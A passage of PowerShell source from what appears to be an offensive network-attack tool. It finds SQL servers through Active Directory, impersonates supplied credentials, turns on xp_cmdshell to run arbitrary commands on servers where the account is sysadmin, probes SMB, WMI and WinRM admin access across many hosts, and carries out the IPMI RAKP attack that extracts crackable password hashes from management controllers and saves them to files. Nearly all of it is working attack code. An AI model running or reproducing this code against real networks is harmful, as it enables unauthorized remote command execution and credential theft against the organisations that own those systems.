            return  Send-UdpDatagram -ComputerName $ComputerName

        }

        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = $Computer
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($MSSQL).AddArgument($timeout).AddArgument($IPAddress)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        $AllInstances = @()

        function New-Searcher {
            $directoryEntry = [ADSI]"LDAP://$domain"
            $searcher = New-Object System.DirectoryServices.DirectorySearcher($directoryEntry)
            $searcher.PageSize = 1000
            return $searcher
        }

        function Get-ADSQLInstances {
            param(
                [Parameter(Mandatory = $false)]
                [string]$LDAPFilter = "(servicePrincipalName=MSSQLSvc/*)"
            )

            # Initialize an empty array to hold all instances
            $AllInstances = @()

            # Use New-Searcher function to create the DirectorySearcher object
            $ADSearcher = New-Searcher
            $ADSearcher.Filter = $LDAPFilter
            $ADSearcher.SearchScope = "Subtree"
    
            try {
                $Results = $ADSearcher.FindAll()
                foreach ($Result in $Results) {
                    $Entry = $Result.GetDirectoryEntry()
                    $SPNs = $Entry.servicePrincipalName
                    foreach ($SPN in $SPNs) {
                        if ($SPN.StartsWith("MSSQLSvc/")) {
                            $InstanceDetails = $SPN.Replace("MSSQLSvc/", "").Split(":")
                            $ComputerName = $InstanceDetails[0]
                            $InstanceName = if ($InstanceDetails.Length -gt 1) { $InstanceDetails[1] } else { "Default" }

                            # Combine ComputerName and InstanceName
                            $FullInstanceName = if ($InstanceName -eq "Default" -or $InstanceName -eq "MSSQLSERVER") { 
                                $ComputerName.ToLower() 
                            }
                            else { 
                                "$($ComputerName.ToLower())\$InstanceName" 
                            }

                            # Add the full instance identifier to the AllInstances array
                            $AllInstances += $FullInstanceName
                        }
                    }
                }
            }
            finally {
                $ADSearcher.Dispose()
            }

            # Return the array of all instances
            return $AllInstances
        }

        if (!$IPAddress) { $AllInstances = Get-ADSQLInstances }

        # Poll the runspaces and display results as they complete
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)

                    if ($result -eq "Unable to connect") { continue }

                    # Foreach result, store it in the AllInstances Array
                    $result | ForEach-Object { $AllInstances += $_ }

                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        # Clean up
        $runspacePool.Close()
        $runspacePool.Dispose()
        $AllInstances = $AllInstances.ToUpper()
        $AllInstances = $AllInstances.Trim()
        $AllInstances = $AllInstances | Select -Unique | Sort-Object

        $MSSQLComputers = $AllInstances | ForEach-Object {
            $computerPart = ($_ -split '\\')[0]
            if ($computerPart -like '*.*') {
                $computerPart
            }
            else {
                $computerPart -split '\.' | Select-Object -First 1
            }
        }

        $UniqueMSSQLComputers = $MSSQLComputers | Sort-Object -Unique
        $FilePath = Join-Path -Path $MSSQL -ChildPath ("MSSQL-" + "All-Discovered-MSSQL-Servers" + ".txt")

        # Read existing entries from the file
        $ExistingEntries = @()
        if (Test-Path -Path $FilePath) {
            $ExistingEntries = Get-Content -Path $FilePath
        }

        # Compare and append only new entries
        $NewEntries = $UniqueMSSQLComputers | Where-Object { $_ -notin $ExistingEntries }
        $NewEntries | Add-Content -Path $FilePath -Encoding ASCII -Force -ErrorAction "SilentlyContinue"

        # Filter out instances not present in [array]$Computers
        $ComputerNames = [array]$Computers | ForEach-Object {
            if ($_.Properties["dnshostname"]) {
                $_.Properties["dnshostname"][0].ToUpper()
            }
            else {
                $_.ToUpper()
            }
        }
        $FilteredInstances = $AllInstances | Where-Object { $ComputerNames -contains $_.Split('\')[0] }

        # Assign the filtered list back to $AllInstances
        $AllInstances = $FilteredInstances

        function Display-ComputerStatus {
            param (
                [string]$ComputerName,
                [string]$OS,
                [System.ConsoleColor]$statusColor = 'White',
                [string]$statusSymbol = "",
                [string]$statusText = "",
                [int]$NameLength,
                [int]$OSLength,
                [string]$IpAddress,
                [string]$NamedInstance
            )

            # Prefix
            Write-Host "MSSQL " -ForegroundColor "Yellow" -NoNewline
            Write-Host "   " -NoNewline
    
            Write-Host ("{0,-16}" -f $IPAddress) -NoNewline
    
            # Display ComputerName, OS, and NamedInstance
            Write-Host ("{0,-$InstanceLength}" -f $NamedInstance) -NoNewline
            Write-Host "   " -NoNewline

            # Display status symbol and text
            Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
            Write-Host $statusText
        }

        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($NamedInstance, $Username, $Password, $LocalAuth, $Domain, $Command)

            try {
                Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public enum LogonType : int {
    LOGON32_LOGON_NEW_CREDENTIALS = 9,
}

public enum LogonProvider : int {
    LOGON32_PROVIDER_DEFAULT = 0,
}

public class Advapi32 {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool LogonUser(
        String lpszUsername,
        String lpszDomain,
        String lpszPassword,
        LogonType dwLogonType,
        LogonProvider dwLogonProvider,
        out IntPtr phToken
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
	
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool RevertToSelf();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hToken);
}
"@ -Language CSharp
            }
            Catch {}
            function Invoke-Impersonation {
                param (
                    [Parameter(Mandatory = $false)]
                    [string]$Username,

                    [Parameter(Mandatory = $false)]
                    [string]$Password,

                    [Parameter(Mandatory = $false)]
                    [string]$Domain,
		
                    [Parameter(Mandatory = $false)]
                    [switch]$RevertToSelf
                )
	
                begin {
                    # Check if RevertToSelf switch is NOT provided
                    if (-not $RevertToSelf) {
                        # If any of the mandatory parameters are missing, throw an error
                        if (-not $Username -or -not $Password -or -not $Domain) {
                            Write-Output "[-] Username, Password, and Domain are mandatory unless the RevertToSelf switch is provided."
                            $PSCmdlet.ThrowTerminatingError((New-Object -TypeName System.Management.Automation.ErrorRecord -ArgumentList (New-Object Exception), "ParameterError", "InvalidArgument", $null))
                        }
                    }
                }

                process {
                    if ($RevertToSelf) {
                        if ([Advapi32]::RevertToSelf()) {
                            # Write-Output "[+] Successfully reverted to original user context."
                        }
                        else {
                            # Write-Output "[-] Failed to revert to original user. Error: $($Error[0].Exception.Message)"
                        }
                        return
                    }

                    $tokenHandle = [IntPtr]::Zero

                    # Use the LogonUser function to get a token
                    $result = [Advapi32]::LogonUser(
                        $Username,
                        $Domain,
                        $Password,
                        [LogonType]::LOGON32_LOGON_NEW_CREDENTIALS,
                        [LogonProvider]::LOGON32_PROVIDER_DEFAULT,
                        [ref]$tokenHandle
                    )

                    if (-not $result) {
                        #Write-Output "[-] Failed to obtain user token. Error: $($Error[0].Exception.Message)"
                        return
                    }

                    # Impersonate the user
                    if (-not [Advapi32]::ImpersonateLoggedOnUser($tokenHandle)) {
                        [Advapi32]::CloseHandle($tokenHandle)
                        Write-Output "[-] Failed to impersonate user. Error: $($Error[0].Exception.Message)"
                        return
                    }
                    #Write-Output "[+] Impersonation successful"
                }
            }
            Function Invoke-SqlQuery {
                [CmdletBinding()]
                param(
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance,

                    [Parameter(Mandatory = $true)]
                    [string]$Query,

                    [Parameter(Mandatory = $false)]
                    [string]$Username,

                    [Parameter(Mandatory = $false)]
                    [string]$Password
                )

                try {
                    # Create and open a SQL connection
                    $SqlConnection = New-Object System.Data.SqlClient.SqlConnection $ConnectionString
                    $SqlConnection.Open()

                    # Create a SQL command object
                    $SqlCommand = $SqlConnection.CreateCommand()
                    $SqlCommand.CommandText = $Query

                    # Execute the query and return the results
                    $Result = $SqlCommand.ExecuteReader()
                    $Table = New-Object System.Data.DataTable
                    $Table.Load($Result)
                    $Table
                }
                catch {
                    Write-Error "An error occurred: $($_.Exception.Message)"
                }
                finally {
                    # Dispose SQL connection and command
                    if ($SqlCommand -ne $null) {
                        $SqlCommand.Dispose()
                    }
                    if ($SqlConnection -ne $null) {
                        $SqlConnection.Dispose()
                    }
                }
            }
            function MSSQL-Command {
                [CmdletBinding()]
                param (
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance,
    
                    [Parameter(Mandatory = $true)]
                    [string]$Command
                )
    
                # Function to revert configurations
                function Revert-Config {
                    param (
                        [string]$Option,
                        [int]$Value
                    )
                    Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure '$Option', $Value; RECONFIGURE;"
                }

                # Store the initial states
                $advancedOptionsConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'show advanced options'"
                $xpCMDConfig = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"

                # Enable 'Show Advanced Options' if needed
                if ($advancedOptionsConfig.value_in_use -eq 0) {
                    Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'show advanced options', 1; RECONFIGURE;"
                    $revertAdvancedOptions = $true
                }

                # Enable 'xp_cmdshell' if needed
                if ($xpCMDConfig.value_in_use -eq 0) {
                    Invoke-SqlQuery -NamedInstance $NamedInstance -Query "sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
                    $revertXpCMDShell = $true
                }

                # Execute the provided command using xp_cmdshell
                $ExecResult = Invoke-SqlQuery -NamedInstance $NamedInstance -Query "EXEC xp_cmdshell '$Command';"

                # Output the result as formatted text
                if ($ExecResult) {
                    $TrimmedResult = $ExecResult | Format-Table -HideTableHeaders | Out-String | ForEach-Object { $_.Trim() }
                    $TrimmedResult | Write-Output
    
                }
                else {
                    Write-Host "No output was returned from the command."
                }

                # Revert 'xp_cmdshell' if it was changed
                if ($revertXpCMDShell) {
                    Revert-Config -Option "xp_cmdshell" -Value 0
                }

                # Revert 'Show Advanced Options' if it was changed
                if ($revertAdvancedOptions) {
                    Revert-Config -Option "show advanced options" -Value 0
                }
            }

            # Start Impersonation (if required)
            if (!$LocalAuth -and $Username -ne "" -and $Password -ne "") {
                Invoke-Impersonation -Username $Username -Password $Password -Domain $Domain
            }

            function SQLAdminCheck {
                [CmdletBinding()]
                param(
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance,
        
                    [Parameter(Mandatory = $false)]
                    [string]$Username,
        
                    [Parameter(Mandatory = $false)]
                    [string]$Password
                )

                try {
                    # Create and open SQL connection
                    Write-Log -Message  "Opening SQL connection to $NamedInstance"
                    $SqlConnection = New-Object System.Data.SqlClient.SqlConnection
                    $SqlConnection.ConnectionString = $ConnectionString
                    $SqlConnection.Open()
        
                    # Create SQL command to check sysadmin membership
                    $SqlCommand = $SqlConnection.CreateCommand()
                    $SqlCommand.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
                    $IsSysAdmin = $SqlCommand.ExecuteScalar()
        
                    # Check if the user is a sysadmin
                    if ($IsSysAdmin -eq "1") {
                        $SYSADMIN = $True
                        if ($Command -ne "") {
                            # Execute the provided command
                            return MSSQL-Command -NamedInstance $NamedInstance -Command $Command
                        }
                        else {
                            return "SUCCESS SYSADMIN"
                        }
                    }
                    elseif ($IsSysAdmin -eq "0") {
                        $SYSADMIN = $False
                        return "SUCCESS NOT SYSADMIN"
                    }
                    else {
                        $SYSADMIN = $False
                        return "ERROR"
                    }
                }
                catch {
                    Write-Error "Error occurred on $NamedInstance`: $_"
                    return $null
                }
                finally {
                    # Close SQL connection and clear pool
                    if ($SqlConnection -and $SqlConnection.State -eq 'Open') {
                        $SqlConnection.Close()
                        [System.Data.SqlClient.SqlConnection]::ClearAllPools()
                    }
                }
            }

            function Test-SqlConnection {
                [CmdletBinding()]
                param (
                    [Parameter(Mandatory = $true)]
                    [string]$NamedInstance
                )
                if (!$LocalAuth) {
                    $ConnectionString = "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
                }
                elseif ($LocalAuth) {
                    $ConnectionString = "Server=$NamedInstance;User Id=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
                }

                $connection = New-Object System.Data.SqlClient.SqlConnection
                $connection.ConnectionString = $ConnectionString
    
                try {
                    $connection.Open()
                    if ($connection.State -eq 'Open') {
                        if ($Username -ne "" -and $Password -ne "") {
                            return SQLAdminCheck -Username "$Username" -Password "$Password" -NamedInstance "$NamedInstance"
                        }
                        else {
                            return SQLAdminCheck -NamedInstance $NamedInstance
            
                        }
                    }
                }
                catch {
                    if ($_.Exception.Message -like "*Login failed for user*") { return "Access Denied" }
                    elseif ($_.Exception.Message -like "*error: 26*") { return "Unable to connect" }
                    elseif ($_.Exception.Message -like "*error: 40*") { return "Unable to connect" }
                    else { return "ERROR" }
                }
                finally {
                    if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth) {
                        Invoke-Impersonation  -RevertToSelf
                    }
                    $connection.Close()
                    [System.Data.SqlClient.SqlConnection]::ClearAllPools()
                }
            }

            $ComputerNameFromInstance = $NamedInstance.Split('\')[0]
            try {
                $IP = $null
                $Ping = New-Object System.Net.NetworkInformation.Ping 
                $IPResult = $Ping.Send($ComputerNameFromInstance, 10)
                if ($IPResult.Status -eq 'Success') {
                    $IP = $IPResult.Address.IPAddressToString
                }
            }

            Catch { $IP = " " * 16 }
            return (Test-SqlConnection -NamedInstance $NamedInstance), $IP

            # revert impersonation (if required)
            if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth) { Invoke-Impersonation  -RevertToSelf }
        }

        foreach ($NamedInstance in $AllInstances) {

    
            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($NamedInstance).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Domain).AddArgument($Command)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace  = $runspace
                    Handle    = $runspace.BeginInvoke()
                    Instance  = $NamedInstance
                    Completed = $false
                })

        }

        $InstanceLength = ($AllInstances | ForEach-Object { $_.Length } | Measure-Object -Maximum).Maximum

        [int]$Global:SuccessCount = 0
        
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $runspaceData = $runspace.Runspace.EndInvoke($runspace.Handle)
            
                    $result = $runspacedata[0]
                    $IP = $runspacedata[1]
            
                    $SysAdminFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-SYSADMIN-Accessible-MSSQL-Instances.txt")
                    $AccessibleFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-Accessible-MSSQL-Instances.txt")
            
                    if (!$Username) { $Username = $env:username }
                    if ($result -eq "Unable to connect") { continue }

                    if ($result -eq "Access Denied") {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        continue
                    }

                    if ($result -eq "ERROR") {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR - $Result" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        continue
                    }

                    elseif ($result -eq "Success") {
                        $Global:SuccessCount ++
                        Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                        continue            
                    }

                    elseif ($result -eq "SUCCESS SYSADMIN") {
                        $Global:SuccessCount ++
                        Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$SysAdminFilePath" -Encoding "ASCII" -Force
                        continue            
                    }
           
            
                    elseif ($result -eq "SUCCESS NOT SYSADMIN") {
                        $Global:SuccessCount ++
                        Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                        continue            
                    }

                    elseif ($Command -ne "" -and $Result -ne "") {
                        $Global:SuccessCount ++
                        Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
                        Write-Output ""
                        Write-output $Result
                        Write-Output ""
                        continue
                    }

                    elseif ($result -like "*untrusted domain and cannot be used with Windows authentication*") {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "Untrusted Domain" -NamedInstance $($runspace.Instance) -IpAddress $IP
                        continue
                    }

                    # Dispose of runspace and close handle
                    $runspace.Runspace.Dispose()
                    $runspace.Handle.AsyncWaitHandle.Close()
                }
            }

            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })
        
        $runspacePool.Close()
        $runspacePool.Dispose()

        if (Test-Path -Path $SysAdminFilePath) {
            Get-Content -Path $SysAdminFilePath |
            Sort-Object -Unique |
            Set-Content -Path $SysAdminFilePath
        }

        if (Test-Path -Path $AccessibleFilePath) {
            Get-Content -Path $AccessibleFilePath |
            Sort-Object -Unique |
            Set-Content -Path $AccessibleFilePath
        }

    }

    ################################################################################################################
    ################################################ Function: All #################################################
    ################################################################################################################
    Function Method-all {
        # Create a runspace pool
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Domain, $Timeout, $IPAddress)

            Function Test-Port {
                param ($ComputerName, $Port)
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
                $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)

                if ($wait) {
                    try {
                        $tcpClient.EndConnect($asyncResult)
                        return $true
                    }
                    catch {
                        return $false
                    }
                }
                else {
                    return $false
                }
            }

            # Check Ports
            $WinRMPort = Test-Port -ComputerName $ComputerName -Port 5985
            $WMIPort = Test-Port -ComputerName $ComputerName -Port 135
            $SMBPort = Test-Port -ComputerName $ComputerName -Port 445

            # if all three fail, return and kill the runspace
            if (-not $SMBPort -and -not $WMIPort -and -not $WinRMPort) {
                return "Unable to connect"
            }

            # SMB Check
            if ($SMBPort) {
                $SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction SilentlyContinue
                if (-not $SMBCheck) {
                    $SMBAccess = $False
                }
                else {
                    $SMBAccess = $True
                }
            }

            # WMI Check
            if ($WMIPort) {
                try {
                    Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction Stop
                    $WMIAccess = $True
                }
                catch {
                    $WMIAccess = $False
                }
            }

            # WinRM Check
            if ($WinRMPort) {
                try {

                    if ($IPAddress) {
                        # Define the function before using it
                        function Resolve-IPToDNSName {
                            param (
                                [string]$IPAddress
                            )
                            try {
                                $hostEntry = [System.Net.Dns]::GetHostEntry($IPAddress)
                                return $hostEntry.HostName
                            }
                            catch {
                                return "Unable to resolve"
                            }
                        }

                        # Use the function to resolve DNS Name
                        $ComputerName = Resolve-IPToDNSName -IPAddress $ComputerName
                    }

                    Invoke-Command -ComputerName $computerName -ScriptBlock { echo "Successful Connection PME" } -ErrorAction Stop
                    $WinRMAccess = $True
                }
                catch {
                    if ($_.Exception.Message -like "*Access is Denied*") {
                        $WinRMAccess = $False
                    }
                    elseif ($_.Exception.Message -like "*cannot be resolved*") {
                        $WinRMAccess = $False
                    }
                }
            }

            return @{
                WMIAccess   = $WMIAccess
                SMBAccess   = $SMBAccess
                WinRMAccess = $WinRMAccess
            }
        }

    

        # Create and invoke runspaces for each computer
        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Domain).AddArgument($Timeout).AddArgument($IPAddress)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }

        [int]$Global:SuccessCount = 0
        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)
                
                    if ($result -eq "Unable to connect") { continue }

                    # Build string of successful protocols
                    $successfulProtocols = @()
                    if ($result.SMBAccess -eq $True) { $successfulProtocols += "SMB" }
                    if ($result.WinRMAccess -eq $True) { $successfulProtocols += "WinRM" }
                    if ($result.WMIAccess -eq $True) { $successfulProtocols += "WMI" }

                    if ($successfulProtocols.Count -gt 0) {
                        $Global:SuccessCount ++
                        $statusText = $successfulProtocols -join ', '
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText $statusText -NameLength $NameLength -OSLength $OSLength
                        Append-BHQuery -ComputerName $($runspace.ComputerName.Split('.')[0]) -Domain $Domain
                        continue
                    }
                    else {
                        if ($SuccessOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                        continue
                    }
                }
            }
            Start-Sleep -Milliseconds 100
        } while ($runspaces | Where-Object { -not $_.Completed })

        $runspacePool.Close()
        $runspacePool.Dispose()
    }

    ################################################################################################################
    ################################################ Function: All #################################################
    ################################################################################################################
    Function Method-IPMI {
     
        $Global:DisplayedIPMIUserCount = $False
        
        function Send-Receive {
            [CmdletBinding()]
            param (
                [Parameter(Mandatory = $true)]
                [ValidateNotNull()]
                [System.Net.Sockets.UdpClient]$Sock,

                [Parameter(Mandatory = $true)]
                [ValidateNotNullOrEmpty()]
                [string]$IP,

                [Parameter(Mandatory = $true)]
                [ValidateNotNull()]
                [Byte[]]$Data,

                [Parameter(Mandatory = $true)]
                [ValidateRange(1, 65535)]
                [int]$Port
            )

            $remoteEP = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IP), $Port)
            $receivedBytes = $Sock.Send($Data, $Data.Length, $remoteEP)
            $receiveBytes = $Sock.Receive([ref]$remoteEP)
            return $receiveBytes
        }

        function Test-IP {
            param (
                [Parameter(Mandatory = $true)]
                [ValidateNotNullOrEmpty()]
                [string]$IP,

                [Parameter(Mandatory = $true)]
                [ValidateNotNull()]
                [Byte[]]$SessionID,

                [Parameter(Mandatory = $true)]
                [ValidateNotNull()]
                [System.Net.Sockets.UdpClient]$Sock,

                [Parameter(Mandatory = $true)]
                [ValidateRange(1, 65535)]
                [int]$Port
            )

            $attemptLimit = 3
            $attemptCount = 0

            while ($attemptCount -lt $attemptLimit) {

                $data = 0x06, 0x00, 0xff, 0x07
                $data += 0x06, 0x10, 0x00, 0x00
                $data += 0x00, 0x00, 0x00, 0x00
                $data += 0x00, 0x00, 0x20, 0x00
                $data += 0x00, 0x00, 0x00, 0x00
                $data += $SessionID
                $data += 0x00, 0x00, 0x00, 0x08
                $data += 0x01, 0x00, 0x00, 0x00
                $data += 0x01, 0x00, 0x00, 0x08
                $data += 0x01, 0x00, 0x00, 0x00
                $data += 0x02, 0x00, 0x00, 0x08
                $data += 0x01, 0x00, 0x00, 0x00

                try {
                    $sResponse1 = Send-Receive -Sock $Sock -IP $IP -Data $data -Port $Port
                    return $sResponse1
                }

                catch [System.Net.Sockets.SocketException] {
                    Write-Log -Message  "[S] $IP does not have IPMI/RMCP+ running or is not vulnerable (Attempt $attemptCount)(User=$User)"
                    $attemptCount++

                    if ($attemptCount -eq $attemptLimit) {
                        if ($SuccessOnly) { $Sock.close ; return -111 }
                        if ($IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Red" -statusSymbol "[-] " -statusText "IPMI not running or vulnerable" -NameLength 16 }
                        elseif (!$IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Red" -statusSymbol "[-] " -statusText "IPMI not running or vulnerable" -NameLength $NameLength -OS $OS -OSLength $OSLength }
                        $Sock.Close()
                        return -111
                    }
                }
            }
        }

        function Attempt-Retrieve {
            param (
                [Parameter(Mandatory = $true)]
                [ValidateNotNullOrEmpty()]
                [string]$User,

                [Parameter(Mandatory = $true)]
                [ValidatePattern('^\d{1,3}(\.\d{1,3}){3}$')] 
                [string]$IP,

                [Parameter(Mandatory = $true)]
                [ValidateRange(1, 65535)]
                [int]$Port
            )
    
            $attemptLimit = 3
            $attemptCount = 0
            $IPMISuccess = $False

            while ($attemptCount -lt $attemptLimit) {

                $rSessionID = (30..90) + (97..122) | Get-Random -Count 4 | % { [Byte[]]$_ }
                $sock = New-Object System.Net.Sockets.UdpClient
                $sock.Client.ReceiveTimeout = 250

                $tResponse = Test-IP -IP $IP -SessionID $rSessionID -Port $Port -Sock $sock
                if ($tResponse -eq -111) {
                    $sock.Close()
                    return -111
                }

                if ($tResponse.Length -gt 0) {

                    $rRequestSALT = (30..90) + (97..122) | Get-Random -Count 16 | % { [Byte[]]$_ }
                    $sUserLength1 = [Byte]($User.Length + 28), 0x00
                    $sUserLength2 = [Byte]$User.Length
                    $sHexUser = [System.Text.Encoding]::ASCII.GetBytes($User)
                    $rRequestID = $tResponse[24..27]

                    $data = 0x06, 0x00, 0xff, 0x07
                    $data += 0x06, 0x12
                    $data += 0x00, 0x00, 0x00, 0x00
                    $data += 0x00, 0x00, 0x00, 0x00
                    $data += $sUserLength1
                    $data += 0x00, 0x00, 0x00, 0x00
                    $data += $rRequestID  
                    $data += $rRequestSALT
                    $data += 0x14, 0x00, 0x00
                    $data += $sUserLength2
                    $data += $sHexUser

        
                    try {
                        $sResponse1 = Send-Receive -Sock $sock -IP $IP -Data $data -Port $Port
                        $iMessageLength = $sResponse1[14]
                        if ($sResponse1[17] -eq 18) {
                            #Write-Host "[-] Invalid username: $User"
                            return
                        }
                        if ($iMessageLength -eq 60) {

                            $sResponseData = $sResponse1[24..$sResponse1.Length]

                            if (($sResponseData.Length * 2) -eq (($iMessageLength - 8) * 2)) {
                                $Global:IPMI_halt = $true
                                $rSessionIDHex = ($rSessionID | ForEach-Object ToString X2) -join ''
                                $rRequestIDHex = ($rRequestID | ForEach-Object ToString X2) -join ''
                                $rResponseSALTHex = ($sResponseData[0..31] | ForEach-Object ToString X2) -join ''
                                $rResponseHashHex = ($sResponseData[32..$sResponseData.Length] | ForEach-Object ToString X2) -join ''
                                $sUserLength2Hex = ($sUserLength2 | ForEach-Object ToString X2) -join ''
                                $sHexUserHex = ($sHexUser | ForEach-Object ToString X2) -join ''
                                $rRequestSALTHex = ($rRequestSALT | ForEach-Object ToString X2) -join ''
                                $Hash = $rSessionIDHex + $rRequestIDHex + $rRequestSALTHex + $rResponseSALTHex + '14' + $sUserLength2Hex + $sHexUserHex + ':' + $rResponseHashHex
                                $Hash = $Hash.ToLower()
                                $IPMISuccess = $True
   
                                if ($IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength 16 }
                                elseif (!$IPAddress) { Display-ComputerStatus -ComputerName $ComputerName -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OS $OS -OSLength $OSLength }
                                
                                Write-Host
                                $User + ":" + $Hash | Write-Host
                                
                                if (-not (Test-Path -Path "$IPMI\.IPMI-All.txt")) { New-Item -Path "$IPMI" -Name ".IPMI-All.txt" -ItemType "File" -Force }
                                if (-not (Test-Path -Path "$IPMI\$ComputerName.txt")) { New-Item -Path "$IPMI" -Name "$ComputerName.txt" -ItemType "File" -Force }
                                
                                if (-not (Get-Content "$IPMI\$ComputerName.txt" | Select-String -Pattern "^${User}:")) { $User + ":" + $Hash | Out-File -Encoding "ASCII" -Append -FilePath "$IPMI\$ComputerName.txt" }
                                if (-not (Get-Content "$IPMI\.IPMI-All.txt" | Select-String -Pattern "\[${ComputerName}\]${User}")) { "[" + $ComputerName + "]" + $User + ":" + $Hash | Out-File -Encoding "ASCII" -Append -FilePath "$IPMI\.IPMI-All.txt" }

                                Write-Host
                                
                                $attemptCount = 3
                            }

                        }
                        else {
                            $sock.Close()
                            return
                        }

                    }
                    catch {
                        # Error AR
            
                        $attemptCount ++
                        Write-Log -Message  "[A] Trying user again (Attempt=$AttemptCount)(User=$User)"
                        $sock.Close()
                    }

                    finally {
                        $sock.Close()
    
                    }
                }
            }
    
            if ($IPMISuccess) {

